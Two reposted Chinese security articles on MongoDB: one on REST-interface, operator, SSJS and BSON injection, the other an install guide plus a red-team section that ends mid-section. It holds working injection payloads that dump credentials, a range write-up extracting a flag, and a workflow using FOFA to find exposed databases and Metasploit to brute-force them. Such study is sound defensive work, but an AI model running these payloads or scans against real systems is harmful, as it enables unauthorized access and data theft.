# MongoDB
### **初识 MongoDB**

在介绍 [MongoDB 漏洞](http://www.freebuf.com/news/146697.html)之前，我们应该先了解这个数据库。在各大知名的[web项目](https://so.csdn.net/so/search?q=web%E9%A1%B9%E7%9B%AE&spm=1001.2101.3001.7020)中都有应用 NoSQL 数据库，其中 MongoDB 是时下最流行的NoSQL数据库。此外，Microsoft 在其云平台 Azure 上提供 [MongoDB 数据库](http://www.freebuf.com/articles/database/125127.html)，这说明该数据库很快将被应用于企业软件。

简而言之，[MongoDB](https://so.csdn.net/so/search?q=MongoDB&spm=1001.2101.3001.7020) 是一个非常高性能（它的主要优点），可扩展（如果需要，可以在几个服务器上轻松扩展）、开源（可以由大公司调整）的 NoSQL 数据库。MongoDB 拥有属于自己的请求语言，但不支持关系型SQL语言的请求。MongoDB是典型的key-value数据库，没有table概念。

下载MongoDB安装工具包，可以看到两个可执行文件：Mongo和mongod。 Mongod是数据库的server端主程序，用于存储数据并处理请求。而Mongo是一个用C ++和JS（V8）编写的官方客户端。

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/1506301622200.png!small)](https://image.3001.net/images/20170925/1506301622200.png)

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063016368588.png!small)](https://image.3001.net/images/20170925/15063016368588.png)

### **MongoDB的安装与使用**

安装过程不再赘述，我们只关注更加有趣的部分。首先，我们来看一下REST接口。 它是一个Web界面，默认端口28017，可通过浏览器远程控制其数据库。使用这个DBMS选项，我们发现了几个漏洞：两个存储型XSS，未公开的SSJS(Server Side JavaScript，比如node.js)命令执行和多个CSRF漏洞。下图演示了这个REST界面：

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063016585084.png!small)](https://image.3001.net/images/20170925/15063016585084.png)

我们将详细说明上述漏洞。这些字段客户端和日志有两个存储的XSS漏洞，这意味着使用HTML代码向数据库发出任何请求，这段代码将被写入到REST界面的页面的源代码中，并将在访问此页面的人的浏览器中执行。这些漏洞使以下攻击成为可能：

> 1.发送带有SCRIPT和JS地址的请求。
> 
> 2.管理员在浏览器中打开Web界面，并在此浏览器中执行JS代码。
> 
> 3.通过JSONP脚本从远程服务器请求执行命令。
> 
> 4.脚本使用参数未验证的SSJS代码执行命令。
> 
> 5.结果发送到我们的远程主机，写入日志。

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063016743977.png!small)](https://image.3001.net/images/20170925/15063016743977.png)

至于参数未验证的ssjs远程代码执行，我们已经写了一个模板，可以根据需要进行修改。

[http://vuln-host:28017/admin/](http://vuln-host:28017/admin/)$cmd/?filter_eval=function(){re- turn db.version() }&limit=1

$ cmd在这个例子中是一个可以自定义的空函数，大家知道了吗？:)

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063016911921.png!small)](https://image.3001.net/images/20170925/15063016911921.png)

### **玩转MongoDB驱动**

假设有一个搭建好的Apache+PHP+MongoDB的web服务器和一个有漏洞的PHP脚本。

这个脚本的主要片段如下：

$q = array(“name” => $_GET['login'], “password” => $_ GET['password']);

$cursor = $collection->findOne($q);

当数据被接收时，该脚本向MongoDB数据库发出请求。如果输入的用户密码正确，那么它会接收，并输出用户的数据。看起来如下：

`echo 'Name: ' . $cursor['name'];`

`echo 'Password: ' . $cursor['password'];`

假设已经发送了以下参数（True）：

```cobol
?login=admin&password=pa77w0rd
```

那么对数据库的请求将如下所示：

```csharp
db.items.findOne({"name" :"admin", "password" : "pa77w0rd"})
```

由于数据库包含密码为pa77w0rd的用户管理员，所以此时数据库响应为True；如果使用其他名称或密码，那么响应将不会返回（False）。

除了语法的差异，MongoDB和其他数据库大致相同。因此，admin账户的信息需要隐藏起来，我们将输出信息中关于admin的数据筛选掉：

```php
db.items.find({"name" :{$ne : "admin"}})
```

我想你已经有了如何欺骗这个登录验证的想法。我们从理论到实践。首先创建一个请求，这个请求将符合以下条件：密码不是1，用户是admin。

```php
db.items.findOne({"name" :"admin", "password" : {$ne : "1"}})
```

有关上述帐户的信息作为回应：

`{`

`"_id" : ObjectId("4fda5559e5afdc4e22000000"), "name" : "admin",`

`"password" : "pa77w0rd"`

`}`

在PHP中将如下所示：

```cobol
$q = array("name" => "admin", "password" => array("\$ne" => "1"));
```

只需要将密码变量声明为一个数组：

```cobol
?login=admin&password[$ne]=1
```

因此，输出admin数据（True）。 这个问题可以通过函数is_array（）将输入参数转变为字符串类型来解决。

注意正则表达式可以并且应该用在诸如findOne（）和find（）这样的函数中。使用的例子：

```php
db.items.find({name: {$regex: "^y"}})
```

该请求将找到以字母y开头的用户。 假设在脚本中使用了对数据库的以下请求：

```cobol
$cursor1=$collection->find(array("login"=>$user, "pass" => $pass));
```

从数据库接收到的数据将以下面的结构显示在页面上：

`echo 'id: '. $obj2['id'] .'<br>login: '.  $obj2['login']`

`.'<br>pass: '. $obj2['pass'] . '<br>';`

正则表达式可以帮助我们收集到我们想要的所有数据 ，我们所要做的仅仅是将收集到信息转换为脚本所需要的数据类型：

```ruby
?login[$regex]=^&password[$regex]=^
```

我们将收到以下回复：

`id: 1`

`login: Admin` 

`pass: parol` 

`id: 4`

`login: user2` 

`pass: godloveman` 

`id: 5`

`login: user3` 

`pass: thepolice=`

此外还有另一种方法来利用该漏洞：

```cobol
?login[$not][$type]=1&password[$not][$type]=1
```

在这种情况下输出如下：

`login: Admin` 

`pass: parol` 

`id: 4`

`login: user2` 

`pass: godloveman` 

`id: 5`

`login: user3` 

`pass: thepolice`

该算法适用于find（）和findOne（）。

### **SSJS请求注入漏洞分析**

如果MongoDB和PHP一起使用，存在一个与服务器发出的SSJS请求有关的典型漏洞。

假设我们有一段存在漏洞的代码，它将用户数据注册到数据库中，然后在操作过程中输出某些字段的值。 类似于留言簿的功能。

代码如下所示：

```php
$q = "function() { var loginn = '$login'; var passs = '$pass';          db.members.insert({id : 2, login : loginn, pass : passs});
```

一个重要的条件是变量$ pass和$ login直接从数组$ _GET获取，并且不对$ _GET获取的信息进行过滤：

`$login = $_GET['login'];`

`$pass = $_GET['password'];`

以下是执行此请求并从数据库输出数据的代码：

`$db->execute($q);`

`$cursor1 = $collection->find(array("id" => 2)); foreach($cursor1 as $obj2){`

`echo "Your login:".$obj2['login'];`

`echo "<br>Your password:".$obj2['pass'];`

`}`

测试脚本准备好了，接下来就是练习。 发送测试数据：

```cobol
?login=user&password=password
```

接收以下数据作为回应：

`Your login: user`

`Your password: password`

我们试图利用这个漏洞，从最简单的引号开始：

```cobol
?login=user&password=';
```

，SSJS代码由于出错而未被执行。但是，如果发送以下数据，所有内容都会发生变化：

```cobol
/?login=user&password=1'; var a = '1
```

接下来将代码改写，使页面能显示代码的执行结果：

```cobol
?login=user&password=1'; var loginn = db.version(); var b='
```

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063017192613.png!small)](https://image.3001.net/images/20170925/15063017192613.png)

当执行上述代码后，JS代码变成了如下的形式：

`$q = ?function() { var loginn = user; var passs = '1';` 

`var loginn = db.version();` 

`var b='';` 

`db.members.insert({id : 2, log- in : loginn, pass : passs}); }?`

现在我们可以通过这个漏洞来阅读数据库其他的记录：

```cobol
/?login=user&password= '; var loginn = tojson(db.members. find()[0]); var b='2
```

让我们来详细的了解一下：

> 1.  已知的函数结构可以用于重写变量并执行任意代码。
> 
> 2.  tojson（）函数有助于从数据库中获得完整的响应。 
> 
> 3.  最重要的部分是db.members.find（）[0]，其中members是一个表，而find（）是一个输出所有记录的函数。 结尾处的数组表示我们处理的记录数。 通过爆破结尾处数组的值，我们可以从数据库中收到记录。

当然，代码执行后可能会没有输出，这时我们需要基于时间的注入方法，这种技术利用服务器响应延迟来接收数据。 举一个例子：

`?login=user&password=';`

`if(db.version()>"2")`

`{ sleep(10000); exit;}` 

`var loginn =1;` 

`var b='2`

这个请求可以让我们知道数据库版本。 如果超过2（例如2.0.4），那么我们的代码将被执行，并且服务器会以延迟响应。

### **嗅探MongoDB**

众所周知，MongoDB允许创建数据库的特殊用户。 有关数据库中用户的信息存储在表db.system.users中。

我们对上述表中用户名字段和密码字段感兴趣。 用户列包含user login，pwd – MD5 string？％login％：mongo：％password％？其中login和password包含用户的登录名，哈希值，密钥和密码。

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063017426317.png!small)](https://image.3001.net/images/20170925/15063017426317.png)

所有数据都是未加密传输的，并且通过劫持数据包可以获取用户名和密码的特定数据。 在MongoDB服务器上认证时，需要劫持客户端发送的随机数，登录名和密钥。 包含以下形式的MD5字符串：

```cobol
%nonce% + %login% + md5(%login% + ":mongo:" + %passwod%)。
```

编写软件自动劫持数据并不困难，但会暴力劫持登录名和密码的后果却十分严重。

### **BSON数据的漏洞分析**

现在让我们来研究一下基于BSON格式数据的漏洞。

BSON（二进制JavaScript对象符号）是一种主要用作存储各种数据（Bool，int，string等）的计算机数据交换格式。 现假设存在一个有两条记录的表：

`> db.test.find({})`

`{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" :`

`"admin", "isadmin" : true }`

`{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" : "noadmin", "isadmin" : false }`

还有一个参数存在注入点的数据库请求：

```cobol
>db.test.insert({ "name" : "noadmin2", "isadmin" : false})
```

只需将设计好的BSON对象插入列名称即可：

```cobol
>db.test.insert({"name\x16\x00\x08isadmin\x00\x01\x00\ x00\x00\x00\x00" : "noadmin2", "isadmin" : false})
```

isadmin 之前 0×08 指定了数据类型为布尔值，0×01将对象值设置为true，而不是默认分配。 

现在看看表中有什么：

`> db.test.find({})`

`{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" : "admin", "isadmin" : true }`

`{ "_id" : ObjectId("5044ebc3a91b02e9a9b065e1"), "name" : "noadmin", "isadmin" : false }`

`{ "_id" : ObjectId("5044ebf6a91b02e9a9b065e3"), "name" : null, "isadmin" : true, "isadmin" : true }`

Isadmin的false已经变成了true！

[![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063017646160.png!small)](https://image.3001.net/images/20170925/15063017646160.png)

![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063017668277.png!small)![十分钟看懂MongoDB攻防实战](https://image.3001.net/images/20170925/15063017658723.png!small)

在现实生活中可能会遇到上述的攻击和漏洞，我们不仅应该考虑在MongoDB中运行的安全代码，还要考虑DBMS本身的漏洞。希望通过本文的介绍能让大家了解到NoSQL数据库也不是安全无忧的数据库。

转载自：[https://www.freebuf.com/articles/database/148823.html](https://www.freebuf.com/articles/database/148823.html)


# 数据库攻防之MongoDB


MongoDB是一个安全性相对较高的非关系型数据库，它的安全问题主要出现在使用、配置过程当中。目前随着MongoDB的流行，它也成为了红队攻防领域不可忽视的数据库。

## 0x01 MongoDB简介

MongoDB 是一个由C++编写、基于分布式文件存储的开源数据库系统，旨在为 web 应用提供可扩展的高性能数据存储解决方案。它将数据存储为一个文档，数据结构由键值对组成，文档类似于 JSON 对象。字段值可以包含其他文档、数组以及文档数组。

```
{
    name: "mac",
    age: "20",
    job: "pentestor",
    habits: ["music", "pentest"]
}
```

MongoDB是一个面向文档存储的数据库，默认端口是27017。与此同时它作为最像关系型数据库的非关系型数据库，操作起来也相对比较简单，以下为 MongoDB 的特点及优点：

```
1、MongoDB可在本地或网络中创建数据镜像，这使得它拥有更强的扩展性。
2、MongoDB支持丰富的查询表达式，查询指令使用JSON形式的标记，可轻易查询文档中内嵌的对象及数组。
3、MongoDB支持各种编程语言，包括Ruby、Python、Java、PHP、C#等。
4、MongoDB使用Map/Reduce来对数据进行批量处理和聚合操作，Map函数调用emit(kr,value)遍历集合中的所有记录，将key、value传递给Reduce进行处理。
5、MongoDB安装、操作非常简单。
```

由于NoSQL数据库适用于超大规模数据的存储，因此使用NoSQL数据库的场景也越来越多，例如我们熟知的Google、Facebook等全球大型互联网公司都在使用它来处理数以万计的数据信息。而MongoDB作为NoSQL数据库，它的的安全性主要由组成生态系统的各个部分共同负责。虽然MongoDB中具有一些内置的安全功能，但是由于在使用过程中会出现配置错误、更新不及时等问题，从而有可能导致漏洞的产生。

## 0x02 MongoDB安装

### MongoDB安装配置

#### Windows下安装

**下载地址：https://www.mongodb.com/download-center/community**  
目前市场上 MongoDB 的主流版本是3.4和3.6，但我们在本地以4.x为例进行安装。在官网中提供了可用于32位和64位系统的预编译二进制包，需要注意的是MongoDB2.2之后的版本已经不再支持Windows XP系统了。  
![截屏2021-11-02 下午3.18.35](https://image.3001.net/images/20220414/1649880178_62572c725df26361e50e7.png!small)

MongoDB为Windows提供了两种安装方式，分别是msi和zip方式。前者方便快捷，但只推荐4.0版本以上使用该方式进行安装，这主要是因为4.x版本对msi安装方式进行了优化，而3.x和更低的版本都需要在安装完毕后手动进行配置。后者解压即安装，相对来说比较灵活，可以将其安装至任意目录。以下则是不同WIndows系统版本适合的MongoDB版本信息：

```
1. MongoDB for Windows 64-bit 适合 64位 Windows Server 2008 R2, Windows 7 ,以及最新版本的Windows系统
2. MongoDB for Windows 32-bit 适合 32位 的Window 系统及最新的Windows Vista，32位系统的的MongoDB最大数据库位2GB
3. MongoDB for Windows 64-bit Legacy 适合 64位 的 Windows Vista, Windows Server 2003, ݊ Windows Server 2008
```

双击运行即可使用 msi 方式安装 MongoDB  
![截屏2021-11-07 下午5.12.49](https://image.3001.net/images/20220414/1649880179_62572c73eeb6fa05532dd.png!small)  
通过`Custom`自定义安装目录  
![截屏2021-11-07 下午5.14.01](https://image.3001.net/images/20220414/1649880182_62572c7612d7d71d44861.png!small)  
![截屏2021-11-07 下午5.13.52](https://image.3001.net/images/20220414/1649880183_62572c7745a1d5b8a7e89.png!small)  
选择不安装compass（MongoDB图形化管理工具），如果安装的话会需要花费较多的时间  
![截屏2021-11-07 下午5.14.08](https://image.3001.net/images/20220414/1649880184_62572c786b4b46aec179f.png!small)  
安装完成  
![截屏2021-11-07 下午5.15.26](https://image.3001.net/images/20220414/1649880185_62572c79ecbe3cef81959.png!small)

MongoDB的bin目录中存在两个应用，分别是`mongo.exe`和`mongod.exe`，分别是MongoDB的客户端软件以及服务端软件。  
![截屏2021-11-07 下午5.16.06](https://image.3001.net/images/20220414/1649880187_62572c7b2c9bb903e210f.png!small)

与此同时将 MongoDB 的bin目录添加至环境变量中  
![截屏2021-11-07 下午5.18.21](https://image.3001.net/images/20220414/1649880188_62572c7c0b702118eb188.png!small)

编写配置文件`mongod.cfg`（MongDB 3.x中不包含该文件，需要自己创建目录来制作服务），以便于后续以配置文件的方式启动 MongoDB 服务

```
systemLog:
    destination: file //设置日志存储文件
    path: C:\mongodb\log\mongodb.log  //设置日志存储位置
    logAppend: true //设置日志是否以追加形式记录

storage:
    journal: 
        enabled: true //设置是否回滚日志
    dbPath: C:\mongodb\data //设置数据存储目录

net:
    port: 27017 //绑定端口
    bindIp: 127.0.0.1 //绑定IP，如果需要远程登录需要配置本地IP
```

![截屏2021-11-07 下午6.01.44](https://image.3001.net/images/20220414/1649880189_62572c7d18eb0effe7c5c.png!small)

为了能在终端中可以通过`net`命令来管理MongoDB，我们可以将 MongoDB 服务添加至服务中去，当然前提是我们要以管理员身份执行终端。

```
mongod --config "c:\Program Files\MongDB\Server\4.0\bin\mongod.cfg" --install
```

如果出现以下错误，解决方法是重新编写配置文件并在其中使用空格代替`tab`  
![截屏2021-11-07 下午5.59.47](https://image.3001.net/images/20220414/1649880189_62572c7dcbd914b9acdbf.png!small)

完成后 Windows 便有了 MongoDB 服务，我们可以在服务中来管理 MongoDB，包括开机启动、设置启动方式等。  
![截屏2021-11-07 下午6.05.17](https://image.3001.net/images/20220414/1649880190_62572c7e7b2463c47b98a.png!small)  
我们以管理员身份打开终端启动 MongoDB

```
net start mongodb //启动MongoDB
net stop mongodb //停止MongoDB
```

如果需要移除 MongDB 服务可以使用以下命令

```
C:\mongodb\bin\mongod.exe --remove
```

运行命令可直接进入 MongoDB 数据库当中

```
mongo
```

默认连接到`test`数据库，饿哦吗能够在其中完成一些简单的算术运算

```
mongo
> db
> 1+1
```

尝试插入数据并查看已插入的数据

```
> db.data.insert({"user":"mac"})
> db.data.find()
```

![截屏2021-11-07 下午6.08.27](https://image.3001.net/images/20220414/1649880191_62572c7f360227e97e9fa.png!small)

#### Linux下安装

在 Linux 中安装 MongoDB 与 Windows 类似，首先导入 MongDB 的公共GPG密钥

```
wget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add -
```

如果出现 gnupg 未安装的错误，可安装 gnupg 解决

```
apt-get install gnupg
```

完成后再次导入密钥并为 MongoDB 创建文件

```
echo "deb http://repo.mongodb.org/apt/debian buster/mongodb-org/4.4 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list
```

![截屏2021-11-07 下午3.03.30](https://image.3001.net/images/20220414/1649880192_62572c80046998a913656.png!small)

通过 apt 命令更新本地软件数据包

```
sudo apt-get update
```

准备工作完成后我们开始安装MongoDB

```
apt-get install -y mongodb-org //安装最新稳定版
apt-get install -y mongodb-org=4.4 mongodb-org-server=4.4 mongodb-org-shell=4.4 mongodb-org-mongos=4.4 mongodb-org-tools=4.4 //安装指定版
```

![截屏2021-11-07 下午3.02.46](https://image.3001.net/images/20220414/1649880193_62572c8166eb5fda23403.png!small)

需要注意的是如果仅指定`mongodb-org=4.4`，那么无论指定哪个版本都会安装每个 MongoDB 包中的最新版本。可使用以下命令查看可选版本

```
echo "mongodb-org hold" | sudo dpkg --set-selections 
echo "mongodb-org-server hold" | sudo dpkg --set-selections 
echo "mongodb-org-shell hold" | sudo dpkg --set-selections 
echo "mongodb-org-mongos hold" | sudo dpkg --set-selections
echo "mongodb-org-tools hold" | sudo dpkg --set-selections
```

大多数类 Unix 系统都提供了基于每个进程和每个用户来限制和控制系统资源(例如线程，文件和网络连接)使用的方法。虽然这些限制可防止单个用户使用过多的系统资源，但有时这些限制的默认值较低，可能会在MongoDB正常运行时产生许多问题，因此我们可根据需要进行调整。

启动MongoDB

```
sudo systemctl start mongod
```

如果在启动时出现以下错误

```
Failed to start Mongod.service:Unit mongod.service not found
```

可以使用以下命令解决并在完成后重新启动

```
sudo systemctl daemon-reload
```

查看 MongoDB 是否已启动

```
sudo systemctl status
```

![截屏2021-11-07 下午3.05.33](https://image.3001.net/images/20220414/1649880195_62572c831f49f82d3991a.png!small)

为 MongoDB 配置开机启动

```
sudo systemctl enable mongod
```

使用以下命令可停止或重启MongoDB

```
sudo systemctl stop mongod
sudo systemctl restart mongod
```

当然在`/var/log/mongodb/mongod.log`中存放着MongoDB的日志，如果需要删除可使用以下命令删除整个数据库日志目录

```
sudo rm -r /var/log/mongodb
```

### MongoDB连接

#### Windows下连接

**下载地址：https://www.mongodb.com/download-center/compass**  
我们可安装数据库图形化管理工具compass来方便地管理 MongoDB，点击新建连接即可连接数据库  
![截屏2021-11-07 下午6.37.48](https://image.3001.net/images/20220414/1649880196_62572c840126f8f4db5b5.png!small)  
如果 MongoDB 服务未开启，可使用以下方法开启 MongoDB 服务

```
mongod -dbpath c:\mongdb\data\db
```

查看数据库所拥有的角色

```
> use admin
> show roles
```

![截屏2021-11-07 下午6.46.57](https://image.3001.net/images/20220414/1649880196_62572c84b7cd93f243693.png!small)

新建连接用户并授权

```
> db.createUser({user:"mac",pwd:"123456",roles:[{"role":"dbAdmin","db":"admin"},{ "role":"backup","db":"admin"}]})
> db.auth("mac","123456")
```

![截屏2021-11-07 下午9.59.09](https://image.3001.net/images/20220414/1649880197_62572c855a611a6e7b4b1.png!small)

成功在本地登录 MongoDB

```
mongo -u mac -p 123456 localhost:27017/admin
```

![截屏2021-11-07 下午6.57.03](https://image.3001.net/images/20220414/1649880198_62572c86266a98c344c8d.png!small)  
除了使用本地登录外，更多情况下我会选择使用 navicat 来远程登录，前提是我们需要在配置文件`mongod.cfg`中将`bindIp`设置为0.0.0.0，设置完成后需重启服务  
![截屏2021-11-07 下午6.59.16](https://image.3001.net/images/20220414/1649880198_62572c86e1b417abd7246.png!small)

Navicat 远程连接成功  
![截屏2021-11-07 下午6.59.32](https://image.3001.net/images/20220414/1649880199_62572c87d05c7e6ee7ef1.png!small)

账号管理扩展命令：

```
> db.updateUser("root",{roles:[{role:"readWriteAnyDatabase",db:"admin"}]}) //修改用户权限
> db.changeUserPassword("username","新密码") //修改用户密码
> db.dropUser('test') //删除用户
```

**参考文章：**

**https://www.jianshu.com/p/f5afc6488f9e**  
**MongDB命令参考：**

**https://www.runoob.com/mongodb/mongodb-databases-documents-collections.html**

#### Linux下连接

MongoDB配置文件默认设置 bindIp 为127.0.0.1，因此默认情况下 MongoDB 只能接受本地连接。如果需要远程连接，我们可以在 MongoDB 配置文件`/etc/mongdb.conf`下设置bindIp 为0.0.0.0，需要注意的是 MongoDB 2.x 与 3.x 配置文件格式有点不同，以下为3.x版本

```
sudo gedit /etc/mongod.conf
sudo systemctl restart mongod
# 连接配置
bindIP:0.0.0.0
```

![截屏2021-11-07 下午3.34.18](https://image.3001.net/images/20220414/1649880200_62572c88dcf964115245b.png!small)

使用 Navicat 远程连接成功  
![截屏2021-11-07 下午4.26.06](https://image.3001.net/images/20220414/1649880201_62572c89e0bb11a8f7c52.png!small)

## 0x03 MongoDB基础用法

MongoDB 可以拥有多个数据库，每个数据库包含一个或多个集合（collections），每个集合包含一个或多个文档（documents），通过命令`mongo`可进入数据库当中

### 基础操作

**创建数据库**  
如果数据库存在则直接进入数据库，否则会创建新的数据库

```
use macdb
```

查看当前数据库

```
> db
```

检查数据库列表

```
> show dbs
```

![截屏2021-11-07 下午3.35.40](https://image.3001.net/images/20220414/1649880202_62572c8ac85cc66f838f0.png!small)

**数据插入**  
插入一些数据

```
> db.data.insert({"user":"mac"})
> db.data.insert({"user":"mac","age":13})
> db.data.insert({"user":"tom","age":20})
```

![截屏2021-11-07 下午3.39.04](https://image.3001.net/images/20220414/1649880203_62572c8ba4c3bd7975dfb.png!small)

**数据查询**  
查询全部数据

```
> db.data.find()
```

查询特定数据

```
> db.data.find({"age":13})
```

![截屏2021-11-07 下午3.42.06](https://image.3001.net/images/20220414/1649880204_62572c8c88f21edea5f7c.png!small)

**数据删除**  
使用 remove 方法可按特定条件从集合中删除文档

```
> db.data.remove({"age":13})
> db.data.find()
```

![截屏2021-11-07 下午3.52.55](https://image.3001.net/images/20220414/1649880205_62572c8d7ab45f3d8acd4.png!small)

如果需要删除集合可以通过以下方式

```
show collections
db.data.drop()
show collections
```

![截屏2021-11-07 下午3.51.54](https://image.3001.net/images/20220414/1649880206_62572c8e402bc59569ff4.png!small)  
删除数据库

```
db.dropDatabase()
```

![截屏2021-11-07 下午3.56.33](https://image.3001.net/images/20220414/1649880207_62572c8f129690878c333.png!small)

### 扩展：自搭渗透环境

熟悉了 MongoDB 的基础操作后，我们可搭建一个实验环境来测试 MongoDB 数据库，使用 kali 来模拟生产机器并安装 MongDB 、php以及web应用程序，假设web环境已经搭建好，那么尝试配置数据库

#### 创建数据库

```
> use mac
> db
```

#### 插入数据

将测试数据插入集合`users`和`products`当中

```
> db.users.insert({"username":"tom","password":"tom"})
> db.users.insert({"username":"jim","password":"jim"})
> db.users.insert({"username":"bob","password":"bob"})
> db.products.insert({"email":"tom@gmail.com","price":"1500USD"}
  )
> db.products.insert({"email":"jim@gmail.com","price":"50USD"})
> db.products.insert({"email":"bob@gmail.com","price":"4500USD"})
```

#### 安装MongoDB驱动

PHP web应用程序使用 MongoDB 的前提需安装对应的驱动，否则无法调用

```
sudo apt-get install php-pear
sudo pecl install mongo
sudo apt-get install php-mongodb
```

## 0x04 MongoDB渗透

### SQL注入

这里以墨者靶场为例，源码如下：  
![1](https://image.3001.net/images/20220414/1649880207_62572c8fe0682323dab4f.jpg!small)

靶场漏洞地址如下：

```
http://219.153.49.228:45718/new_list.php?id=1
```

![截屏2021-11-08 上午12.01.13](https://image.3001.net/images/20220414/1649880209_62572c912b77f85a82700.png!small)

常规情况下通过单引号判断注入，返回不同页面说明存在注入点

```
/new_list.php?id=1'
```

![截屏2021-11-08 上午12.05.48](https://image.3001.net/images/20220414/1649880210_62572c923eba4ef5b70ca.png!small)

构造 payload 测试回显内容

```
/new_list.php?id=1'});return ({title:1,content:'2
```

![截屏2021-11-08 上午12.27.49](https://image.3001.net/images/20220414/1649880211_62572c93398948139702e.png!small)

成功爆出数据库名为`mozhe_cms_Authority`

```
/new_list.php?id=1'});return ({title:tojson(db),content:'1
```

![截屏2021-11-08 上午1.59.28](https://image.3001.net/images/20220414/1649880212_62572c94221456d3cf328.png!small)

成功爆出集合名，分别为`notice`、`Authority_confidential`、`system.indexes`

```
new_list.php?id=1'});return ({title:tojson(db.getCollectionNames()),content:'1
```

![截屏2021-11-08 上午2.01.01](https://image.3001.net/images/20220414/1649880213_62572c950c2f68355ca41.png!small)

针对集合`Authority_confidential`爆出对应文档

```
new_list.php?id=1'});return ({title:tojson(db.Authority_confidential.find()[0]),content:'1
new_list.php?id=1'});return ({title:tojson(db.Authority_confidential.find()[1]),content:'1
```

![截屏2021-11-08 上午2.10.37](https://image.3001.net/images/20220414/1649880214_62572c96165efc52b28f7.png!small)  
![截屏2021-11-08 上午2.10.48](https://image.3001.net/images/20220414/1649880215_62572c97264ef4b8787c2.png!small)

成功拿到用户名为`mozhe`，两个密码经过md5解密后如下：

```
0eae21a0d4eb17267a0981af5f8f0397: 179303
a83cd5ad5ed3e1c5597441aaab289f5c: dsansda
```

使用`mozhe/dsansda`可登录应用  
![截屏2021-11-08 上午2.28.59](https://image.3001.net/images/20220414/1649880216_62572c987fb540c211425.png!small)

成功拿到flag：mozhe0500ad3c303c29201bbe1dbef89  
![截屏2021-11-08 上午2.29.36](https://image.3001.net/images/20220414/1649880225_62572ca19965fddc0b172.png!small)

### 未授权登录

通过 fofa 可导出 mongodb 数据库的IP地址，搜索语句如下：

```
"mongodb" && protocol="mongodb"
```

![截屏2021-11-08 上午2.33.56](https://image.3001.net/images/20220415/1649963398_625871864e183d096d83a.png!small)

使用 fofaAPI 可导出 MongoDB 数据库的IP地址，配置如下

```
{'rule':'"mongodb" && protocol="mongodb"','page':'','size':'100','fields':'host','is_full':''}
```

![截屏2021-11-08 上午2.37.13](https://image.3001.net/images/20220415/1649963400_625871888f52da126a8a0.png!small)  
使用 MSF 对拿到的 MongDB 数据库进行爆破

```
msfconsole
msf > use auxiliary/scanner/mongodb/mongodb_login
msf > set rhosts 'file:/root/Desktop/ouput.txt'
msf > run
```

![截屏2021-11-08 上午2.45.07](https://image.3001.net/images/20220414/1649880230_62572ca65865c67e134e4.png!small)

随意选择爆破成功的IP，登录数据库课成功查看目标数据库信息  
![截屏2021-11-08 上午2.51.13](https://image.3001.net/images/20220414/1649880231_62572ca7e332ebf01869e.png!small)

### 自动化评估

可以通过自动化方法来查找之前所提到的所有漏洞，存在一个工具NoSQLMap  
**工具地址：https://github.com/codingo/NoSQLMap**

#### NoSQLMap介绍

NoSQLMap是一个开源的Python工具，主要用于审计和自动化注入攻击（包括版本小于2.2.4 getshell），并利用NoSQL数据库中的缺省配置弱点以及使用NoSQL的web应用程序来泄漏数据库中的数据。目前这个工具主要集中在MongoDB上，但是在未来版本中基于其他NoSQL数据库的平台，比如CouchDB、Redis、Cassandra等提供支持。

#### NoSQLMap特性

> 自动化对MongoDB、CouchDB数据库枚举和克隆攻击
> 
> 通过基于MongoDB的web应用程序来提取数据库信息
> 
> 使用默认访问和枚举版本扫描MongDB、CouchDB数据库的网段
> 
> 使用强字典爆破MongDB、CouchDB数据库的哈希
> 
> 针对MongoCLient的PHP应用程序参数注入返回所有数据库记录
> 
> JavaScript函数变量转移和任意代码注入来返回所有的数据库记录
> 
> 基于计时类的攻击类似于SQL盲注来验证没有回显信息的JavaScript注入漏洞

#### NoSQLMap安装使用

主要通过setup.py来安装NoSQLMap

```
python2 setup.py install
```

![截屏2021-11-08 上午3.06.14](https://image.3001.net/images/20220414/1649880233_62572ca90160e685b5a08.png!small)

也可以使用 docker 来进行安装

```
cd docker
docker build -t nosqlmap .
```

或者在 docker-compose 中使用

```
docker-compose build
docker-compose run nosqlmap
```

进入 nosqlmap

```
Nosqlmap
```

![截屏2021-11-08 上午3.07.17](https://image.3001.net/images/20220414/1649880234_62572caa6f5cf5f7de3f9.png!small)

首先需要选择1进行选项配置  
![截屏2021-11-08 上午3.08.14](https://image.3001.net/images/20220414/1649880236_62572cac244aad2609e80.png!small)

通过翻译可以了解这些配置

```
1.设置目标 host/host/IP 目标 Web 服务器 如：(www.google.com) 或者任何你想要攻击的 MongoDB 服务器。
2.设置 Web 应用 port-TCP 如果一个 Web 应用成为目标，为 Web 应用设置 TCP 端口。
3.设置 URI 路径，部分 URI 包含页面名称及任何非主机名称的参数 如：(/app/acct.php?acctid=102)。
4.设置 HTTP 请求方法 (GET/POST) 设置请求方法为 GET 或 POST ；现在只能使用 GET 方法但是后续会增加 POST 方法。
5.设置我的本地 Mongo/Shell IP-Set 如果直接攻击一个 MongoDB 实例，设置这个选项到目标 Mongo 安装的IP来复制受害者服务器或打开 Meterpreter Shell。
6.设置 Shell 监听端口，如果开放 Meterpreter Shell 就会指定端口。
7.加载选项 file-Load 加载之前保存的 1-6 中的设置。
8.加载选项 从 Burp 保存的 (request-Parse) 请求中加载 Burp Suite 的请求，并填充 Web 应用选项。、
9.保存选项设置 file-Save 保存 1-6 中的设置以便未来使用。
x.返回主菜单 meun-Use 使用这个选项开始攻击。
```

将配置设置完成后尝试利用  
![截屏2021-11-08 上午3.10.17](https://image.3001.net/images/20220414/1649880237_62572caddd25cb36a87ea.png!small)

## 0x05 MongoDB安全防护

### 漏洞危害

对外开放的MongoDB服务如果存在未授权访问，那么攻击者可以随意多数据库进行增删改查操作，存在严重的数据泄漏风险。

### 漏洞成因

